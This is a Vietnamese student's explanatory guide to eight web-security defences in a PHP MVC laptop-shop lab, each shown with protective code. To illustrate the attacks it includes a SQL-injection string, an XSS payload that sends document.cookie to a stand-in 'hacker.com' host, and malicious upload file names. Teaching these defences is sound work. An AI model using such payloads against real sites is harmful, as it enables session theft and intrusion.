# CẨM NANG GIẢI THÍCH AN TOÀN & BẢO MẬT WEB (LAB 6.1)
**HỌC PHẦN: CÔNG NGHỆ WEB AN TOÀN - HỌC VIỆN KỸ THUẬT MẬT MÃ**  
**Dành cho người mới bắt đầu: Dễ hiểu - Trực quan - Thực tế**  
**Tác giả thực hiện:** Phạm Tiến Đạt (AT200311 - Lớp AT20A)  

---

## LỜI NÓI ĐẦU: VÌ SAO WEBSITE CẦN ĐƯỢC BẢO VỆ?

Hãy tưởng tượng một website bán hàng giống như một **ngôi nhà hoặc một cửa hàng ngoài đời thực**:
- **Cửa hàng không có bảo mật (như code bài cũ):** Cửa không khóa, ai gửi giấy tờ gì nhân viên cũng tin ngay, két sắt chứa mật khẩu để mở toang, khách hàng có thể tự do đi vào phòng giám đốc.
- **Cửa hàng an toàn (Lab 6.1):** Có bảo vệ túc trực ở cổng soát vé, kiểm tra căn cước công dân, niêm phong thư từ, két sắt mã hóa và camera an ninh giám sát 24/7.

Tài liệu này sẽ giải thích cặn kẽ từng tấm khiên bảo vệ trong **Lab 6.1** mà không dùng các thuật ngữ hàn lâm khó hiểu!

---

## PHẦN 1: MÔ HÌNH KIẾN TRÚC MVC LÀ GÌ? VÌ SAO NÓ AN TOÀN HƠN?

### 1. So sánh giữa Bài 4 và Bài 6
- **Ở Bài 4 (Code cũ - Kiểu thủ tục):** Mỗi trang web là một file độc lập (`productList.php`, `cartAdd.php`, `userDelete.php`). Người dùng có thể gõ thẳng tên file trên thanh địa chỉ. Trong một file vừa có lệnh truy vấn cơ sở dữ liệu, vừa xử lý logic, vừa in ra mã HTML. Nếu một file bị hổng là lộ toàn bộ hệ thống.
- **Ở Bài 6 (Mô hình MVC - Model, View, Controller):** Hệ thống chia thành 3 bộ phận chuyên trách, có **Người gác cổng duy nhất**:

```
                  [ NGƯỜI DÙNG TRÊN TRÌNH DUYỆT ]
                                 │
                                 ▼ (Mọi yêu cầu đều phải qua đây)
                    [ CỔNG DUY NHẤT: index.php ]
                                 │
                                 ▼
                     [ BỘ PHẬN ĐIỀU PHỐI: ROUTER ]
                                 │
                                 ▼
         ┌────────────────────────────────────────────────┐
         │       CONTROLLER (Người quản lý nghiệp vụ)      │
         │  - Kiểm tra xem khách đã đăng nhập chưa?        │
         │  - Kiểm tra khách có quyền xem không?           │
         │  - Dữ liệu gửi lên có sạch sẽ, an toàn không?   │
         └──────────────┬──────────────────┬──────────────┘
                        │                  │
         (Hỏi dữ liệu)  ▼                  ▼  (Gửi kết quả để vẽ)
      ┌───────────────────────┐      ┌─────────────────────────┐
      │   MODEL (Két dữ liệu) │      │  VIEW (Người vẽ giao diện│
      │  - Chỉ làm việc với DB│      │  - Chỉ hiển thị HTML    │
      │  - Dùng Prepared Stmt │      │  - Đã làm sạch ký tự lạ │
      └───────────────────────┘      └─────────────────────────┘
```

### 2. File kiểm soát:
- **Người gác cổng:** `Bai 6/NhiemVu1_WebBanLaptop_MVC_Security/index.php`
- **Bộ định tuyến an toàn:** `core/Router.php`
- **Người quản lý cơ sở:** `core/Controller.php`

---

## PHẦN 2: CHI TIẾT 8 CƠ CHẾ BẢO MẬT ĐÃ ĐƯỢC CÀI ĐẶT TRONG LAB 6.1

---

### 🛡️ CƠ CHẾ 1: CHỐNG TẤN CÔNG SQL INJECTION (Tiêm Lệnh Cơ Sở Dữ Liệu)

#### 1. Hiểu đơn giản lỗ hổng này là gì?
- Giả sử hệ thống tìm kiếm kiểm tra: `"SELECT * FROM products WHERE name = '" + từ_khóa + "'"`.
- Nếu khách nhập bình thường: `Dell XPS` -> Câu lệnh chạy bình thường.
- Nhưng nếu kẻ xấu nhập: `' OR '1'='1` -> Câu lệnh biến thành: `"SELECT * FROM products WHERE name = '' OR '1'='1'"`. Kết quả là máy tính thấy `1=1` luôn đúng, kẻ xấu có thể **xem trộm toàn bộ dữ liệu, xóa sạch bảng hoặc đăng nhập mà không cần mật khẩu!**

#### 2. Lab 6.1 bảo vệ như thế nào? (Kỹ thuật Prepared Statements)
Hệ thống sử dụng **PDO Prepared Statements** (Tham số hóa câu lệnh bằng dấu hỏi chấm `?`):
- **Nguyên lý:** Máy chủ gửi câu lệnh mẫu có dấu `?` xuống cơ sở dữ liệu để biên dịch khung xương trước. Sau đó mới nhét dữ liệu người dùng vào dấu `?`.
- Cơ sở dữ liệu coi dữ liệu người dùng **100% chỉ là chuỗi văn bản thông thường**, tuyệt đối không bao giờ coi nó là lệnh thực thi. Dù kẻ xấu có gõ `' OR 1=1` thì nó cũng chỉ tìm laptop có tên đúng là `' OR 1=1`.

#### 3. Đoạn code bảo vệ nằm ở đâu?
- File: [`core/Database.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Database.php) (Cấu hình `ATTR_EMULATE_PREPARES => false`)
- File: [`core/Model.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Model.php) (Dòng 17 - hàm `execute()`):
  ```php
  protected function execute(string $sql, array $params = []): PDOStatement {
      $stmt = $this->db->prepare($sql); // Tách riêng lệnh
      $stmt->execute($params);           // Đưa dữ liệu vào tham số
      return $stmt;
  }
  ```
- File: [`models/Product.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/models/Product.php) (Mọi hàm tìm kiếm, lọc hãng đều dùng `WHERE brand = ?`).

---

### 🛡️ CƠ CHẾ 2: CHỐNG TẤN CÔNG XSS (Cross-Site Scripting - Chèn Mã Độc JavaScript)

#### 1. Hiểu đơn giản lỗ hổng này là gì?
- Kẻ xấu đặt tên tài khoản hoặc gửi bình luận có nội dung là đoạn mã JavaScript lén lút: `<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>`.
- Khi người quản trị hoặc người dùng khác mở trang xem danh sách, trình duyệt tưởng đó là mã lập trình hợp lệ và tự động chạy đoạn mã đó -> **Hacker lấy cắp ngay tài khoản của nạn nhân!**

#### 2. Lab 6.1 bảo vệ như thế nào? (HTML Escaping & Content Security Policy)
- **HTML Escaping:** Lab 6.1 dùng hàm `htmlspecialchars()` để "vô hiệu hóa" các ký tự nguy hiểm:
  - `<` bị biến thành `&lt;`
  - `>` bị biến thành `&gt;`
  - `"` bị biến thành `&quot;`
  Khi trình duyệt nhận được, nó chỉ hiển thị chữ `<script>` ra màn hình như chữ viết thông thường chứ không chạy mã độc.
- **Content Security Policy (CSP):** Máy chủ gửi kèm một quy tắc nghiêm ngặt: Trình duyệt chỉ được tải tài nguyên từ các nguồn uy tín được khai báo trước.

#### 3. Đoạn code bảo vệ nằm ở đâu?
- File: [`core/Security.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Security.php) (Dòng 79 - hàm `escape()`):
  ```php
  public static function escape(?string $string): string {
      if ($string === null) return '';
      return htmlspecialchars((string)$string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
  }
  ```
- File: [`views/layouts/main.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/views/layouts/main.php) và tất cả các view: Mọi biến hiển thị ra màn hình đều được bọc qua:
  `<?= Security::escape($p['name']) ?>`

---

### 🛡️ CƠ CHẾ 3: CHỐNG TẤN CÔNG CSRF (Cross-Site Request Forgery - Lừa Đảo Hành Động)

#### 1. Hiểu đơn giản lỗ hổng này là gì?
- Bạn vừa đăng nhập vào trang quản trị của shop laptop. Trình duyệt của bạn đang giữ phiên đăng nhập hợp lệ.
- Kẻ xấu gửi cho bạn 1 email hoặc tin nhắn chứa đường link: `http://trang-web-doc-hai.com`.
- Khi bạn bấm vào, trang đó âm thầm gửi 1 lệnh ngầm sang shop laptop: `POST /admin/productDelete với id = 5`.
- Máy chủ shop laptop thấy lệnh này xuất phát từ trình duyệt của bạn (đang có cookie đăng nhập) nên tưởng là bạn bấm -> **Sản phẩm bị xóa oan uổng!**

#### 2. Lab 6.1 bảo vệ như thế nào? (CSRF Token - Chiếc Vé Bí Mật Dùng 1 Lần)
- Mỗi khi bạn mở một Form (ví dụ Form thêm laptop, sửa user, đổi mật khẩu, xóa món hàng), máy chủ sinh ra một chuỗi mật mã ngẫu nhiên dài 64 ký tự gọi là `csrf_token` và giấu vào form.
- Khi bấm nút gửi, máy chủ so khớp: *"Chiếc vé gửi kèm có đúng với chiếc vé tôi vừa phát cho anh trong phiên này không?"*.
- Nếu kẻ xấu từ trang web độc hại gửi lệnh sang, chúng không thể nào biết được mã token bí mật nằm trong session của bạn -> **Máy chủ phát hiện giả mạo và từ chối xử lý ngay lập tức (Lỗi 403 Forbidden)!**

#### 3. Đoạn code bảo vệ nằm ở đâu?
- File: [`core/Security.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Security.php) (Dòng 50-74):
  - Sinh token: `generateCsrfToken()`
  - Tạo thẻ input ẩn: `getCsrfField()`
  - Kiểm tra hợp lệ: `validateCsrfToken()`
- File: [`core/Controller.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Controller.php) (Dòng 135 - hàm `validateCsrfOrAbort()`):
  Tự động chặn đứng request nếu token không khớp.
- Trong mọi form HTML: Đều có dòng: `<?= Security::getCsrfField() ?>`.

---

### 🛡️ CƠ CHẾ 4: BẢO MẬT MẬT KHẨU NGƯỜI DÙNG (Bcrypt Hashing)

#### 1. Hiểu đơn giản lỗ hổng này là gì?
- Nếu lưu mật khẩu nguyên bản `123456` trong cơ sở dữ liệu: Nếu một ngày hacker xâm nhập được vào máy chủ, chúng sẽ đọc được mật khẩu của tất cả mọi người.

#### 2. Lab 6.1 bảo vệ như thế nào?
- Hệ thống áp dụng thuật toán **Bcrypt** (`PASSWORD_BCRYPT` với độ phức tạp cost=10).
- **Hàm băm một chiều:** Nghĩa là biến mật khẩu `123456` thành một chuỗi xáo trộn kỳ dị: `$2y$10$wT3tJvE4eXo7eN12f6e9kO7x5W8Qh4s0A6d5c1b2a3f4e5d6c7b8a`.
- Không có bất kỳ công thức toán học nào dịch ngược chuỗi băm này trở lại `123456`. Khi đăng nhập, hệ thống băm mật khẩu khách vừa gõ rồi so khớp hai chuỗi băm với nhau bằng hàm `password_verify()`.

#### 3. Đoạn code bảo vệ nằm ở đâu?
- File: [`core/Security.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Security.php) (Dòng 95 - hàm `hashPassword()` và `verifyPassword()`).
- File: [`controllers/AuthController.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/controllers/AuthController.php) (Dòng 49 & Dòng 133).

---

### 🛡️ CƠ CHẾ 5: CHỐNG DÒ MẬT KHẨU BRUTE FORCE (Rate Limiting)

#### 1. Hiểu đơn giản lỗ hổng này là gì?
- Hacker dùng tool tự động chạy hàng chục nghìn lần thử: `admin/123`, `admin/admin123`, `admin/password`... cho đến khi trúng thì thôi.

#### 2. Lab 6.1 bảo vệ như thế nào?
- Hệ thống cài đặt bộ đếm **Rate Limiting** theo địa chỉ IP của người dùng.
- Quy tắc: Cho phép thử sai tối đa **5 lần trong 5 phút**.
- Nếu cố tình đoán sai quá 5 lần: Hệ thống lập tức khóa quyền đăng nhập của IP đó và đưa ra thông báo: *"Bạn đã thử sai quá 5 lần, vui lòng đợi 5 phút sau mới được thử lại!"*. Khi đăng nhập đúng, bộ đếm tự động xóa về 0.

#### 3. Đoạn code bảo vệ nằm ở đâu?
- File: [`core/Security.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Security.php) (Dòng 109 - hàm `checkRateLimit()`):
- File: [`controllers/AuthController.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/controllers/AuthController.php) (Dòng 30):
  ```php
  if (!Security::checkRateLimit('login', 5, 300)) {
      $error = 'Bạn đã đăng nhập sai quá 5 lần liên tiếp. Vui lòng thử lại sau 5 phút!';
  }
  ```

---

### 🛡️ CƠ CHẾ 6: BẢO VỆ PHIÊN LÀM VIỆC (Session Hijacking & Session Fixation)

#### 1. Hiểu đơn giản lỗ hổng này là gì?
- Khi bạn đăng nhập thành công, máy chủ phát cho bạn một mã số phiên (Session ID lưu trong Cookie).
- Nếu kẻ xấu bằng cách nào đó nhìn trộm hoặc đánh cắp được mã số này (Session Hijacking), chúng gắn vào máy của chúng là mạo danh được bạn mà không cần mật khẩu.
- Hoặc kẻ xấu gán sẵn cho bạn một mã số phiên cố định từ trước (Session Fixation).

#### 2. Lab 6.1 bảo vệ như thế nào?
1. **Khóa Cookie (HttpOnly & SameSite):**
   Cấu hình `session.cookie_httponly = 1`: Trình duyệt cấm hoàn toàn mã JavaScript truy cập vào cookie này -> Dù web có bị dính XSS thì hacker cũng không lấy được cookie phiên!
2. **Đổi vé ngay khi đăng nhập (Session Regenerate ID):**
   Hàm `session_regenerate_id(true)` lập tức hủy mã phiên cũ và tạo mã phiên hoàn toàn mới ngay giây phút người dùng đăng nhập thành công.
3. **Kiểm tra dấu vân tay thiết bị (Fingerprint check):**
   Hệ thống lưu lại chuỗi băm của thông tin trình duyệt (`HTTP_USER_AGENT`). Nếu phát hiện Session ID đó đang được dùng bởi một trình duyệt lạ khác đột ngột -> Hệ thống tự động hủy phiên ngay lập tức.

#### 3. Đoạn code bảo vệ nằm ở đâu?
- File: [`core/Security.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Security.php) (Dòng 16 - hàm `startSecureSession()`).
- File: [`controllers/AuthController.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/controllers/AuthController.php) (Dòng 46).

---

### 🛡️ CƠ CHẾ 7: PHÂN QUYỀN TRUY CẬP (Role-Based Access Control - RBAC)

#### 1. Hiểu đơn giản lỗ hổng này là gì?
- Một khách hàng thông thường biết được đường link `index.php?r=admin/products` liền tự ý gõ vào xem và bấm nút xóa sản phẩm của cửa hàng.

#### 2. Lab 6.1 bảo vệ như thế nào?
- Hệ thống chia làm 2 vai trò rõ rệt: `customer` (Khách) và `admin` (Quản trị viên).
- Trong `AdminController`, mọi hành động (Dashboard, Thêm/Sửa/Xóa máy tính, Quản lý User) đều phải đi qua chốt chặn an ninh:
  ```php
  public function __construct() {
      $this->requireAdmin(); // Bắt buộc phải là Admin
  }
  ```
- Nếu một tài khoản khách thường mò vào, hàm `requireAdmin()` phát hiện ngay `role !== 'admin'`, lập tức đuổi người đó về trang chủ kèm thông báo cảnh báo: *"Truy cập bị từ chối! Bạn không có quyền quản trị viên."*.

#### 3. Đoạn code bảo vệ nằm ở đâu?
- File: [`core/Controller.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Controller.php) (Dòng 124 - hàm `requireAdmin()`).
- File: [`controllers/AdminController.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/controllers/AdminController.php) (Dòng 16).

---

### 🛡️ CƠ CHẾ 8: AN TOÀN TẢI TỆP TIN ẢNH (Chống Tấn Công Thực Thi Mã Độc RCE)

#### 1. Hiểu đơn giản lỗ hổng này là gì?
- Form cho phép tải ảnh đại diện của laptop (`.jpg`, `.png`).
- Kẻ xấu đổi tên file mã độc PHP thành `shell.php` hoặc `virus.jpg.php` rồi tải lên máy chủ.
- Sau đó chúng truy cập vào đường dẫn `uploads/shell.php` để chạy mã độc, chiếm toàn quyền kiểm soát máy chủ (Remote Code Execution - RCE).

#### 2. Lab 6.1 bảo vệ 3 lớp như thế nào?
1. **Lớp 1 - Kiểm tra đuôi file:** Chỉ cho phép danh sách trắng: `['jpg', 'jpeg', 'png', 'webp', 'gif']`.
2. **Lớp 2 - Soi ruột file (MIME Type check):** Dùng thư viện `finfo` đọc cấu trúc nhị phân bên trong tệp tin. Dù kẻ xấu có đổi tên file `hack.php` thành `hack.jpg` thì hệ thống vẫn phát hiện ruột không phải là ảnh và từ chối ngay.
3. **Lớp 3 - Đổi tên file ngẫu nhiên:** Hệ thống tự động đặt lại tên file thành `laptop_8f7b2a...jpg` để kẻ xấu không đoán được đường dẫn và không thể ghi đè file hệ thống.
4. **Lớp 4 - Khóa nòng tệp tin bằng `.htaccess`:** Trong thư mục `uploads/`, có một file `.htaccess` đặc biệt cấm máy chủ Apache chạy bất kỳ file mã PHP nào trong thư mục này. Kể cả file độc có lọt vào thì cũng chỉ nằm im như một đống dữ liệu chết, không thể kích hoạt!

#### 3. Đoạn code bảo vệ nằm ở đâu?
- File: [`core/Security.php`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/core/Security.php) (Dòng 142 - hàm `validateAndUploadImage()`).
- File: [`uploads/.htaccess`](file:///c:/Users/datpu/Desktop/Code/CNWAT/Bai%206/NhiemVu1_WebBanLaptop_MVC_Security/uploads/.htaccess):
  ```apache
  <FilesMatch "(?i)\.(php|phtml|php5|phar|exe)$">
      Deny from all
  </FilesMatch>
  php_flag engine off
  ```

---

## PHẦN 3: BẢNG TỔNG KẾT ĐỐI CHIẾU NHANH (DÙNG ĐỂ BẢO VỆ VỚI THẦY CÔ)

Khi thầy cô giáo hỏi: *"Lab 6.1 của em phòng chống các cuộc tấn công web như thế nào?"*, bạn chỉ cần trả lời tự tin 8 ý sau:

| STT | Loại tấn công | Cách Lab 6.1 phòng thủ | File mã nguồn minh chứng |
|:---:|:---|:---|:---|
| **1** | **SQL Injection** | Dùng 100% PDO Prepared Statements (dấu `?`), không nối chuỗi truy vấn | `core/Model.php` &bull; `core/Database.php` |
| **2** | **XSS** | Bọc toàn bộ biến ra giao diện qua hàm `Security::escape()` (`htmlspecialchars`) + CSP Headers | `core/Security.php` &bull; các Views |
| **3** | **CSRF** | Tạo mã `csrf_token` ngẫu nhiên trong session, bắt buộc mọi Form POST phải có token | `core/Security.php` &bull; `core/Controller.php` |
| **4** | **Lộ mật khẩu** | Băm mật khẩu một chiều bằng thuật toán Bcrypt có salt ngẫu nhiên | `core/Security.php` &bull; `controllers/AuthController.php` |
| **5** | **Brute Force** | Rate Limiting: Khóa 5 phút nếu đăng nhập sai quá 5 lần | `core/Security.php` (`checkRateLimit`) |
| **6** | **Session Hijacking / Fixation** | Bật cờ `HttpOnly`, `SameSite`, tái tạo ID phiên sau khi login, kiểm tra User-Agent | `core/Security.php` (`startSecureSession`) |
| **7** | **Leo thang quyền** | Phân quyền RBAC qua Middleware `requireAdmin()`, cấm khách vào trang quản trị | `core/Controller.php` &bull; `controllers/AdminController.php` |
| **8** | **Tải mã độc (RCE)** | Kiểm tra MIME bằng `finfo`, đổi tên ngẫu nhiên, chặn thực thi PHP qua `uploads/.htaccess` | `core/Security.php` &bull; `uploads/.htaccess` |

---
*Bản quyền tài liệu thuộc về sinh viên Phạm Tiến Đạt - AT200311 - Học viện Kỹ thuật Mật mã*
